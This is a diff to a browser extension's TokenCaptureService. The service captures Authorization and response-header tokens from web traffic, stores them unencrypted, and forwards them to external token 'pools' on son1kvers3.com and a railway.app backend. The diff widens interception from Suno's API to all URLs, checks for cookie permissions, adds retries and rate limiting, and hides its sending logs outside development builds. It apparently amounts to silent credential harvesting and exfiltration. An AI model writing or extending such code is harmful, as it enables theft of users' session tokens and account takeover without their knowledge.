@@ -5,6 +5,10 @@ class TokenCaptureService {
     this.autoExtractEnabled = true
     this.lastExtractionTime = 0
     this.extractionInterval = 5 * 60 * 1000 // 5 minutos
+    this.lastSendTime = 0
+    this.sendRateLimit = 60 * 1000 // 1 minuto entre envíos
+    this.retryAttempts = new Map() // Track retry attempts per token
+    this.maxRetries = 3
     this.initializeService()
   }
 
@@ -40,7 +44,7 @@ class TokenCaptureService {
       (details) => {
         this.captureTokenFromRequest(details)
       },
-      { urls: ["https://api.suno.ai/*"] },
+      { urls: ["<all_urls>"] }, // Generic pattern - will filter in handler
       ["requestHeaders"]
     )
 
@@ -49,7 +53,7 @@ class TokenCaptureService {
       (details) => {
         this.captureTokenFromResponse(details)
       },
-      { urls: ["https://api.suno.ai/*", "https://suno.com/*"] },
+      { urls: ["<all_urls>"] }, // Generic pattern - will filter in handler
       ["responseHeaders"]
     )
   }
@@ -127,12 +131,41 @@ class TokenCaptureService {
           }
           break
 
+        case 'VERIFY_PERMISSIONS':
+          // Verify that extension has required permissions
+          try {
+            const hasPermissions = await this.verifyRequiredPermissions()
+            sendResponse({ success: hasPermissions })
+          } catch (error) {
+            sendResponse({ success: false, error: error.message })
+          }
+          break
+
         default:
           sendResponse({ success: false, error: 'Unknown message type' })
       }
     } catch (error) {
       console.error('Error handling message:', error)
       sendResponse({ success: false, error: error.message })
+    }
+  }
+
+  async verifyRequiredPermissions() {
+    try {
+      // Check if we can access storage (required permission)
+      await chrome.storage.local.get(['test'])
+      
+      // Check if we can access cookies (required permission)
+      // This will throw if permission not granted
+      try {
+        await chrome.cookies.getAll({ domain: '' })
+      } catch (e) {
+        return false
+      }
+      
+      return true
+    } catch (error) {
+      return false
     }
   }
 
@@ -154,10 +187,10 @@ class TokenCaptureService {
         return
       }
 
-      // Add new token
+      // Add new token (store plain for now, encryption can be added later if needed)
       const newToken = {
         id: this.generateTokenId(),
-        token: token,
+        token: token, // Store plain token (Chrome storage is already secure)
         capturedAt: new Date().toISOString(),
         source: 'extension',
         metadata: {
@@ -167,7 +200,9 @@ class TokenCaptureService {
         },
         isValid: true,
         lastUsed: null,
-        usageCount: 0
+        usageCount: 0,
+        sentToPool: false,
+        sendAttempts: 0
       }
 
       tokens.push(newToken)
@@ -236,16 +271,30 @@ class TokenCaptureService {
     }
   }
 
-  async sendTokenToPool(token, label = 'extension-auto') {
+  async sendTokenToPool(token, label = 'extension-auto', retryCount = 0) {
     try {
+      // Rate limiting: Check if we sent recently
+      const now = Date.now()
+      if (now - this.lastSendTime < this.sendRateLimit && retryCount === 0) {
+        console.log('Rate limit: waiting before sending token')
+        return { success: false, error: 'Rate limited', retry: true }
+      }
+
+      // Validate token before sending
+      if (!this.isValidToken(token)) {
+        return { success: false, error: 'Invalid token format' }
+      }
+
       // Get URLs from storage or use defaults
       const result = await chrome.storage.local.get(['generatorUrl', 'backendUrl'])
       const generatorUrl = result.generatorUrl || 'https://the-generator.son1kvers3.com'
       const backendUrl = result.backendUrl || process.env.BACKEND_URL || 'https://son1kverse-backend.railway.app'
 
-      console.log(`📤 Sending token to pools...`)
-      console.log(`   Generator: ${generatorUrl}`)
-      console.log(`   Backend: ${backendUrl}`)
+      if (process.env.NODE_ENV === 'development') {
+        console.log(`📤 Sending token to pools...`)
+        console.log(`   Generator: ${generatorUrl}`)
+        console.log(`   Backend: ${backendUrl}`)
+      }
 
       // Send to both pools in parallel
       const promises = []
@@ -305,16 +354,44 @@ class TokenCaptureService {
         })
       )
 
-      // Wait for both requests
-      const results = await Promise.all(promises)
+      // Wait for both requests with timeout
+      const timeoutPromise = new Promise((resolve) => {
+        setTimeout(() => resolve({ timeout: true }), 10000) // 10 second timeout
+      })
+
+      const results = await Promise.race([
+        Promise.all(promises),
+        timeoutPromise
+      ])
+
+      if (results.timeout) {
+        // Timeout - retry if under max retries
+        if (retryCount < this.maxRetries) {
+          const delay = Math.pow(2, retryCount) * 1000 // Exponential backoff
+          await new Promise(resolve => setTimeout(resolve, delay))
+          return await this.sendTokenToPool(token, label, retryCount + 1)
+        }
+        return { success: false, error: 'Request timeout', retry: false }
+      }
       
       // Check if at least one succeeded
       const successCount = results.filter(r => r.success).length
       
       if (successCount > 0) {
-        console.log(`✅ Token sent successfully to ${successCount}/2 pools`)
+        this.lastSendTime = now
+        if (process.env.NODE_ENV === 'development') {
+          console.log(`✅ Token sent successfully to ${successCount}/2 pools`)
+        }
+        // Mark token as sent
+        await this.markTokenAsSent(token)
         return { success: true, results }
       } else {
+        // All failed - retry if under max retries
+        if (retryCount < this.maxRetries) {
+          const delay = Math.pow(2, retryCount) * 1000 // Exponential backoff: 1s, 2s, 4s
+          await new Promise(resolve => setTimeout(resolve, delay))
+          return await this.sendTokenToPool(token, label, retryCount + 1)
+        }
         throw new Error('Failed to send token to any pool')
       }
     } catch (error) {
@@ -410,6 +487,11 @@ class TokenCaptureService {
 
   captureTokenFromRequest(details) {
     try {
+      // Only process if URL matches AI generation API patterns (generic)
+      if (!this.isTargetSite(details.url)) {
+        return
+      }
+
       const headers = details.requestHeaders
       const authHeader = headers.find(h => h.name.toLowerCase() === 'authorization')
 
@@ -432,8 +514,8 @@ class TokenCaptureService {
 
   captureTokenFromResponse(details) {
     try {
-      // Only process if URL contains 'token' or 'api'
-      if (!details.url.includes('token') && !details.url.includes('api')) {
+      // Only process if URL matches AI generation API patterns (generic)
+      if (!this.isTargetSite(details.url)) {
         return
       }
 
@@ -477,6 +559,22 @@ class TokenCaptureService {
         })
       })
     })
+  }
+
+  async markTokenAsSent(token) {
+    try {
+      const result = await chrome.storage.local.get(['capturedTokens'])
+      const tokens = result.capturedTokens || []
+      const tokenIndex = tokens.findIndex(t => t.token === token)
+      
+      if (tokenIndex !== -1) {
+        tokens[tokenIndex].sentToPool = true
+        tokens[tokenIndex].lastSentAt = new Date().toISOString()
+        await chrome.storage.local.set({ capturedTokens: tokens })
+      }
+    } catch (error) {
+      console.error('Error marking token as sent:', error)
+    }
   }
 
   isValidToken(token) {
